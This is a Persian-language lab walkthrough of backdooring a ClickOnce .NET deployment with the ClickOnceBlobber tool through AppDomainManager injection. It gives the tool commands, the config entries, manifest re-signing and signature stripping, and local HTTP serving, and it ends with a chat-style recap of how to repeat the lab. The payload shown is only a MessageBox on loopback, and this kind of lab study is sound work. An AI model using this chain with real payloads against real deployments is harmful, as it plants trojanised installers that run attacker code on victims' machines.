

# ClickOnce + AppDomainManager Injection — MessageBox PoC Lab

## 1. Clone کردن پروژه

Repository مورد استفاده:

`ClickOnceBlobber`

محل پروژه در Lab:

```text
C:\Users\Fani-02\Desktop\AppDomain_Injection\ClickOnceBlobber
```

ورود به مسیر پروژه:

```powershell
cd C:\Users\Fani-02\Desktop\AppDomain_Injection\ClickOnceBlobber
```

---

## 2. بررسی Script

برای مشاهده‌ی Help اسکریپت:

```powershell
python .\clickonce_backdoor.py --help
```

در ابتدا خطای زیر مشاهده شد:

```text
ModuleNotFoundError: No module named 'semver'
```

Dependency موردنیاز نصب شد:

```powershell
pip install semver
```

سپس:

```powershell
python .\clickonce_backdoor.py --help
```

اجرا شد و گزینه‌ی `--poc` مشخص شد.

### نکته

این Lab از:

```text
--poc
```

استفاده می‌کند که Payload آن یک **MessageBox PoC** است.

---

# 3. ساخت Backup از ClickOnce Application

قبل از تغییر ClickOnce package، از Publish اصلی Backup گرفته شد.

```powershell
cd C:\Users\Fani-02\source\repos\clickone\clickone

Copy-Item .\publish .\publish-backup -Recurse
```

ساختار Publish اصلی:

```text
publish
├── clickone.application
└── Application Files
    └── clickone_1_0_0_0
        ├── clickone.application
        ├── clickone.exe.config.deploy
        ├── clickone.exe.deploy
        └── clickone.exe.manifest
```

این Backup برای مقایسه‌ی وضعیت **قبل و بعد از Modification** استفاده شد.

---

# 4. اجرای ClickOnceBlobber روی کپی Lab

برای اینکه Publish اصلی تغییر نکند، یک کپی برای Lab ساخته شد:

```powershell
cd C:\Users\Fani-02\Desktop\AppDomain_Injection\ClickOnceBlobber

Copy-Item `
  "C:\Users\Fani-02\source\repos\clickone\clickone\publish" `
  ".\lab-publish" `
  -Recurse
```

در نتیجه:

```text
ClickOnceBlobber
├── lab-publish
└── ...
```

---

# 5. اجرای MessageBox PoC

Command اصلی:

```powershell
python .\clickonce_backdoor.py `
  --input ".\lab-publish\clickone.application" `
  --url "http://127.0.0.1/" `
  --poc `
  --output ".\lab-output"
```

### پارامترها

```text
--input
```

فایل ClickOnce Application موردنظر را مشخص می‌کند.

در Lab:

```text
.\lab-publish\clickone.application
```

---

```text
--url
```

URL مربوط به Deployment Provider است.

در Lab از loopback استفاده شد:

```text
http://127.0.0.1/
```

---

```text
--poc
```

به Script می‌گوید به‌جای Payload خارجی، از:

```text
examples\MessageBoxPoC.cs
```

استفاده کند.

---

```text
--output
```

محل ساخت ClickOnce package جدید:

```text
.\lab-output
```

---

# 6. Step 1 — Discovering Structure

Script
ابتدا ساختار ClickOnce Application را پیدا کرد:

```text
Deployment manifest:
clickone.application

App manifest:
clickone.exe.manifest

Target EXE:
clickone.exe
```

همچنین `vendor publicKeyToken` مربوط به Application اصلی را استخراج کرد.

در Lab:

```text
cf1d6a2fbc361f4d
```

سپس نام DLL و Class مورد استفاده را تعیین کرد:

```text
DLL:
clickoneHelper.dll

Class:
clickoneManager
```

---

# 7. Step 2 — Preparing Workspace

Script
یک Workspace موقت ایجاد کرد:

```text
clickonce_workspace
```

محل آن:

```text
C:\Users\Fani-02\Desktop\AppDomain_Injection\ClickOnceBlobber\clickonce_workspace
```

---

# 8. Step 3 — Stripping `.deploy`

ClickOnce
فایل‌های Deployment را با پسوند:

```text
.deploy
```

در اختیار دارد.

Script 
در این مرحله `.deploy` را برای پردازش داخلی خود آماده کرد.

در خروجی:

```text
Stripped 2 files
```

---

# 9. Step 4 — ساخت DLL مربوط به PoC

این مهم‌ترین قسمت Lab است.

Script فایل:

```text
examples\MessageBoxPoC.cs
```

را Load می‌کند.

در Source، کلاس اصلی به شکل مفهومی زیر است:

```csharp
public sealed class clickoneManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        Loader.Execute();
        return;
    }
}
```

و `Loader.Execute()` یک `MessageBox` نمایش می‌دهد.

Script
ابتدا Placeholder زیر را جایگزین می‌کند:

```text
{CLASSNAME}
```

با:

```text
clickoneManager
```

سپس یک فایل موقت ایجاد می‌کند:

```text
clickoneHelper.cs
```

و آن را با `csc.exe` کامپایل می‌کند.

خروجی:

```text
clickoneHelper.dll
```

در Lab اندازه DLL:

```text
4096 bytes
```

بود.

بعد از Compilation، فایل Source موقت:

```text
clickoneHelper.cs
```

حذف می‌شود.

---

# نکته بسیار مهم درباره DLL

`clickoneHelper.dll`
خودش یک EXE نیست و ClickOnce مستقیماً آن را اجرا نمی‌کند.

این DLL یک **Managed .NET Assembly** است که شامل:

```text
clickoneManager
Loader
```

است.

رابطه‌ی اصلی این است:

```text
clickone.exe
      │
      ▼
     CLR
      │
      ▼
AppDomain Initialization
      │
      ▼
clickoneManager
(AppDomainManager)
      │
      ▼
InitializeNewDomain()
      │
      ▼
Loader.Execute()
      │
      ▼
MessageBox
```

بنابراین نقش DLL این است که **کد Custom AppDomainManager و callback آن را در خود داشته باشد.**

---

# 10. Step 5 — تغییر `.exe.config`

Script فایل:

```text
clickone.exe.config
```

را ایجاد/تغییر داد.

در Configuration، دو عنصر مهم اضافه شدند:

```xml
<appDomainManagerAssembly
    value="clickoneHelper, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />

<appDomainManagerType
    value="clickoneManager" />
```

مفهوم این دو:

```text
appDomainManagerAssembly
        ↓
clickoneHelper.dll

appDomainManagerType
        ↓
clickoneManager
```

در نتیجه CLR می‌تواند Custom `AppDomainManager` را در زمان Initialization پیدا کند.

حجم Config نهایی:

```text
422 bytes
```

---

# 11. Step 6 — تغییر Application Manifest

Script فایل:

```text
clickone.exe.manifest
```

را تغییر داد.

کارهای اصلی این مرحله:

### حذف Signature-related information

```text
Cleaned signatures
```

### تغییر Vendor `publicKeyToken`

```text
zeroed vendor publicKeyToken
```

### Update کردن اطلاعات Config

```text
clickone.exe.config
```

### اضافه کردن DLL

```text
clickoneHelper.dll
```

با اندازه:

```text
4096 bytes
```

به Application Manifest اضافه شد.

Manifest نهایی:

```text
clickone.exe.manifest
```

اندازه:

```text
3165 bytes
```

---

# 12. Step 7 — تغییر Deployment Manifest

فایل:

```text
clickone.application
```

نیز تغییر داده شد.

کارهای اصلی:

```text
Cleaned signatures
zeroed vendor publicKeyToken
```

همچنین Deployment Provider به:

```text
http://127.0.0.1/clickone.application
```

تغییر داده شد.

Reference مربوط به Application Manifest نیز با:

```text
size
hash
```

به‌روزرسانی شد.

---

# 13. Step 8 — Applying `.deploy`

در این مرحله Script فایل‌های موردنیاز را دوباره در ساختار ClickOnce قرار داد.

خروجی:

```text
Applied to 3 files
```

---

# 14. Step 9 — Building Output

Output نهایی در:

```text
C:\Users\Fani-02\Desktop\AppDomain_Injection\ClickOnceBlobber\lab-output
```

ساخته شد.

ساختار نهایی:

```text
lab-output
│
├── clickone.application
├── clickone.appref-ms
│
└── Application Files
    └── clickone_1_0_0_0
        ├── clickone.application
        ├── clickone.exe.config.deploy
        ├── clickone.exe.deploy
        ├── clickone.exe.manifest
        └── clickoneHelper.dll.deploy
```

---

# 15. `.deploy` چیست؟

پسوند:

```text
.deploy
```

به معنی نوع جدید Executable یا DLL نیست.

ClickOnce در Deployment Package می‌تواند فایل‌ها را با `.deploy` نگهداری کند.

برای مثال:

```text
clickone.exe.deploy
```

در زمان نصب ClickOnce به:

```text
clickone.exe
```

تبدیل می‌شود.

همین موضوع برای:

```text
clickoneHelper.dll.deploy
```

صدق می‌کند و در Installation Cache به:

```text
clickoneHelper.dll
```

تبدیل می‌شود.

---

# 16. Step 10 — ساخت `.appref-ms`

Script فایل:

```text
clickone.appref-ms
```

را ایجاد کرد.

نکته:

`.appref-ms` با `.lnk` یکی نیست.

`appref-ms`
یک **ClickOnce Application Reference** است و به Deployment/Application مربوط می‌شود.

رابطه به شکل زیر است:

```text
.appref-ms
      ↓
ClickOnce Application
      ↓
clickone.application
      ↓
Application Files
      ↓
clickone.exe
```

این فایل مستقیماً به:

```text
clickoneHelper.dll
```

اشاره نمی‌کند.

رابطه DLL با Application از طریق:

```text
clickone.exe.config
```

و Manifest برقرار می‌شود.

---

# 17. اجرای Local HTTP Server

برای اینکه ClickOnce بتواند Deployment Package را از طریق HTTP دریافت کند، Output توسط HTTP Server محلی سرو شد.

از مسیر اصلی پروژه:

```powershell
cd C:\Users\Fani-02\Desktop\AppDomain_Injection\ClickOnceBlobber
```

Command:

```powershell
python .\clickonce_backdoor.py serve `
  --port 80 `
  --dir ".\lab-output"
```

خروجی:

```text
[*] Serving .\lab-output on 0.0.0.0:80
```

در Lab URL:

```text
http://127.0.0.1/clickone.application
```

---

# 18. مشاهده‌ی ClickOnce Requests

در HTTP Server درخواست‌هایی مانند موارد زیر مشاهده شد:

```text
GET /clickone.application
GET /clickone.appref-ms
GET /Application%20Files/
```

این نشان می‌دهد Client در حال دریافت/بررسی ClickOnce Deployment است.

---

# 19. بررسی ClickOnce Cache

بعد از نصب، `clickone.exe` در ClickOnce Cache قرار گرفت.

مسیر Lab:

```text
C:\Users\Fani-02\AppData\Local\Apps\2.0\NV1NZE29.TGE\N0AGYNG7.0K7\clic..tion_cf1d6a2fbc361f4d_0001.0000_9c620073931e8ba1\clickone.exe
```

همچنین:

```powershell
Get-Process dfsvc -ErrorAction SilentlyContinue
```

نشان داد:

```text
dfsvc.exe
```

فعال است.

`dfsvc.exe` مربوط به ClickOnce Deployment Service است.

---

# 20. اجرای Application و مشاهده PoC

در نهایت `clickone.exe` موجود در ClickOnce Cache اجرا شد.

پس از اجرا، MessageBox مربوط به PoC نمایش داده شد.

برای بررسی Process:

```powershell
Get-Process clickone -ErrorAction SilentlyContinue
```

Process مشاهده شد:

```text
clickone
```

این نشان داد که Application اجرا شده و مسیر Custom `AppDomainManager` نیز در این Lab موفق بوده است.

---

# 21. زنجیره نهایی Execution

مدل ذهنی نهایی:

```text
ClickOnce Deployment
        │
        ▼
clickone.application
        │
        ▼
ClickOnce Installation
        │
        ▼
ClickOnce Cache
        │
        ▼
clickone.exe
        │
        ▼
.NET CLR
        │
        ▼
AppDomain Initialization
        │
        ▼
appDomainManagerAssembly
        │
        ▼
clickoneHelper.dll
        │
        ▼
clickoneManager
        │
        ▼
InitializeNewDomain()
        │
        ▼
Loader.Execute()
        │
        ▼
MessageBox
```

## نکته کلیدی

این تکنیک را نباید با **Classic Process Injection** یکی دانست.

در این Lab:

```text
DLL Injection
```

به معنای رایج Windows Process Injection اتفاق نیفتاده است.

در عوض:

```text
ClickOnce
    +
.NET Framework AppDomainManager
    +
Managed Assembly Loading
```

باعث شد کد موجود در `clickoneHelper.dll` در جریان Initialization برنامه وارد مسیر اجرای CLR شود.

## Artifactهای اصلی Lab

```text
clickone.application
clickone.exe.manifest
clickone.exe.config.deploy
clickone.exe.deploy
clickoneHelper.dll.deploy
clickone.appref-ms
```

و مهم‌ترین Artifact مربوط به PoC:

```text
clickoneHelper.dll
```

است که حاوی Custom `AppDomainManager` و کد MessageBox PoC است.


آره، برای اینکه روند آزمایش PoC از اول شفاف باشد، بهتر بود این نکته را همان ابتدا می‌گفتم. فقط یک اصلاح مفهومی مهم هم داریم: در این PoC قرار نیست `clickone.exe` را اجرا کنیم و بعد یک DLL را مثل **Process Injection** داخل آن Inject کنیم؛ `clickone.exe` باید از مسیر ClickOnce اجرا شود و در **Startup/CLR initialization**، `AppDomainManager` سفارشی باعث Load شدن Assembly ما شود.

### روند صحیح Lab از صفر

هر بار که می‌خواهی یک PoC جدید بسازی:

**1. نسخه قبلی ClickOnce را پاک کن**

```powershell
rundll32 dfshim CleanOnlineAppCache
```

و اگر `lab-output` قبلی را هم می‌خواهی دوباره بسازی:

```powershell
Remove-Item .\lab-output -Recurse -Force -ErrorAction SilentlyContinue
```

**2. پروژه اصلی `clickone` را Build/Publish کن**

یعنی همان پروژه‌ی سالم:

```text
clickone
   └── clickone.exe
```

این نسخه، **Target Application** ماست.

**3. ClickOnceBlobber روی Publish آن کار می‌کند**

```text
clickone.exe
      +
clickone.exe.config
      +
clickone.exe.manifest
      ↓
ClickOnceBlobber --poc
      ↓
lab-output
      +
clickoneHelper.dll
```

**4. بعد ClickOnce را اجرا می‌کنیم**

```text
clickone.application
       ↓
dfsvc.exe
       ↓
ClickOnce Activation
       ↓
clickone.exe
       ↓
CLR
       ↓
AppDomainManager
       ↓
clickoneHelper.dll
       ↓
MessageBox
```

پس جمله‌ی دقیق‌تر به‌جای:

> «اول باید clickone.exe رو اجرا کنیم که بتونیم DLL رو Inject کنیم»

این است:

> **ابتدا باید پروژه‌ی `clickone` را Build/Publish کنیم تا `clickone.exe` به‌عنوان Target Application وجود داشته باشد؛ سپس ClickOnceBlobber، Deployment را تغییر می‌دهد تا هنگام Activation همین Application، `clickoneHelper.dll` از طریق `AppDomainManager` در Startup بارگذاری شود.**

و چون PoC فعلی فقط `MessageBox` دارد، اگر `clickone.exe` از مسیر ClickOnce اجرا شود و MessageBox را ببینیم، یعنی زنجیره‌ی PoC کامل شده است.

**نکته‌ی مهم برای تکرار آزمایش:**  
هر بار **نسخه قبلی → Cache پاک → Publish جدید → Blobber → Server → ClickOnce Activation**. این کار باعث می‌شود نسخه‌ی قدیمی Cached با نسخه‌ی جدید قاطی نشود.





https://github.com/user-attachments/assets/ace7c784-b81a-4a90-add2-bd54bc3fff6f


